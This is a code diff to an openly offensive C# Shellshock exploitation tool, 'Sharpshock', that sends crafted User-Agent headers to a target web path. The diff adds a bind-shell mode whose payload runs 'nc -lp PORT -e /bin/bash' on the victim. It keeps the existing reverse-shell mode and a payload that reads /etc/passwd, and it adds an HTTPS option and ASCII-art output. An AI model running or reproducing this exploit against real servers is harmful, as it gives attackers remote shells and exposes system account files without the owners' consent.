@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -15,7 +15,7 @@ namespace Sharpshock
         public void shellshock(string website, string filePath)
         {
 
-            var shellOrEtc = 0;
+            var shellBindOrEtc = 0;
             var userAgent = "";
 
             var lhost = "";
@@ -24,26 +24,37 @@ namespace Sharpshock
             website = website + filePath;
 
 
-            if (website.Substring(0, 7) != "http://")
-                website = "http://" + website;
+            if (website.Substring(0, 7) != "http://" && website.Substring(0, 8) != "https://")
+            {
+                Console.WriteLine("\n[+] Which protocol do you want to use? (HTTP [1] or HTTPS [2])");
+                var protocol = Int32.Parse(Console.ReadLine());
+
+                if (protocol == 1)
+                {
+                    website = "http://" + website;
+                }
+                else
+                {
+                    website = "https://" + website;
+                }
+            }
             
 
             var request = (HttpWebRequest)WebRequest.Create(website);
 
-            Console.WriteLine();
 
-            Console.WriteLine("{0}[+] Testing {1} ",Environment.NewLine, website);
+            Console.WriteLine("\n{0}[+] Testing {1} ",Environment.NewLine, website);
 
-            Console.WriteLine("{0}[+] Reverse shell [1] or read /etc/passwd [2]", Environment.NewLine);
-            shellOrEtc = Int32.Parse(Console.ReadLine());
+            Console.WriteLine("{0}[+] Reverse shell [1], bind shell [2] or read /etc/passwd [3]", Environment.NewLine);
+            shellBindOrEtc = Int32.Parse(Console.ReadLine());
 
 
-            if (shellOrEtc == 1)
+            if (shellBindOrEtc == 1)
             {
-                Console.WriteLine(Environment.NewLine+"[+] Pick a host:");
+                Console.WriteLine("{0}[+] Pick a host:", Environment.NewLine);
                 lhost = Console.ReadLine();
 
-                Console.WriteLine(Environment.NewLine + "[+] Pick a port");
+                Console.WriteLine("{0}[+] Pick a port", Environment.NewLine);
                 port = Int32.Parse(Console.ReadLine());
 
                 Console.WriteLine("{0}[+] Listener: {1}", Environment.NewLine, lhost);
@@ -60,6 +71,16 @@ namespace Sharpshock
 
                 Console.WriteLine("[+] Spawning a shell.");
             }
+            else if (shellBindOrEtc == 2)
+            {
+                Console.WriteLine("{0}[+] Pick a port", Environment.NewLine);
+                port = Int32.Parse(Console.ReadLine());
+
+                userAgent = "() { :;}; /bin/bash -c 'nc -lp" + " " + port + " -e /bin/bash'";
+
+                Console.WriteLine("[+] Server is now listening to incoming connections.{0}", Environment.NewLine);
+                Console.WriteLine("[+] Run this command: nc -v {0} {1} ", website, port);
+            }
             else
             {
                 userAgent = "() { :;}; echo; /bin/cat /etc/passwd";
@@ -74,9 +95,52 @@ namespace Sharpshock
             }
             catch
             {
-                Console.WriteLine("{0}[+] Connection lost",Environment.NewLine);
-                Console.WriteLine("{0}Press enter to exit",Environment.NewLine);
+                printShell();
+                Console.ReadKey();
             }
+        }
+        private void printShell()
+        {
+            Console.Clear();
+            Console.WriteLine("{0}[+] Connection lost", Environment.NewLine);
+            Console.WriteLine("{0}[+] Press enter to exit", Environment.NewLine); 
+            Console.WriteLine(@"
+                                   `,,  
+              `.                  `,,.  
+              `,                  `,,.  
+              .,                 `,,,.  
+              ,,`               `,,,..  
+             `,,`              `,,,,.:, 
+            `.,,:             .,,,..,,.`
+             ,,,,`          `.,,,,:::.` 
+            .,,,,`         `,,,,::,,,`` 
+          ``,,,,.`         ,,,,:,,...`  
+           .,:,`:,       `,,,::,.....,. 
+          .,::: :,       ,,,::,...,,,.` 
+        ``,::: `:,      ,,,::,..,:,...` 
+         .::::`,:;     ,,,::,..,,,...`  
+        `,:;';;;;;:   `,,,:,,,,,....``  
+     ,;,.;'+''''''''. ,,,:,,,,.....`,.  
+     .;';;;;'+++##++#`,,,:,,,....,,..`  
+     `:;'';;'#';;''+.,,,,,,..,,,,...`   
+      :;'';;'+;;`  '`,,,,,,,,,.....`    
+   ``::;':;;'';``.;,`,,,,,,,.......     
+   `,;;;,:;'+;',,;;:,,,,,,,,,....,.     
+    ;'';;;'#''';;;;+;,,,,,.....,..`     
+   ``  `,#+;;+'''+++#:,...,,,,...`      
+  `     `..#+#''''''+:,........``       
+ ````    ``.,;#++''''#;,.....``         
+ `.,,,.````..,,,#@#+#++#+;:,`           
+ `,,'+:,,..,,,,,,::'####';;:            
+  ,:;#@@+.,::::,,:::::::::,,            
+   ,,#@@':::,::::::::::::,,`            
+    `:##`,;;@@:,:::::::,,.`             
+    ``:..,;;@@@@#:,,,,,,.               
+     ```.,:,+@@#;,,;,,,,                
+      .,::,,,;;:,,,,,..`                
+       .,,,,,,,,,,:...`                 
+         ,,,.....,...                   
+           `....,.`");
         }
     }
 }
